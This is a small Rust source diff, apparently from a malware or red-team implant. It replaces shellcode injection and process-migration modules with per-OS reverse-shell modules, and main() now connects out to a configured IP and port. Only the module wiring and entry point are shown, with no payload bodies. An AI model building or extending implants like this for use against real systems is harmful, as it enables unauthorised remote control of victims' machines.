@@ -3,17 +3,17 @@ mod config;
 
 // Load the appropriate operating system's implementation
 #[cfg(unix)]
-mod unix_im;
+mod rco_rev_shell_unix;
 #[cfg(unix)]
-use unix_im::inject_and_migrate;
+use rco_rev_shell_unix::shell;
 
 #[cfg(windows)]
 extern crate windows;
 #[cfg(windows)]
-mod windows_im;
+mod rco_rev_shell_windows;
 #[cfg(windows)]
-use windows_im::inject_and_migrate;
+use rco_rev_shell_windows::shell;
 
 fn main() {
-    inject_and_migrate(config::SHELLCODE);
+    shell(config::IP, config::PORT);
 }
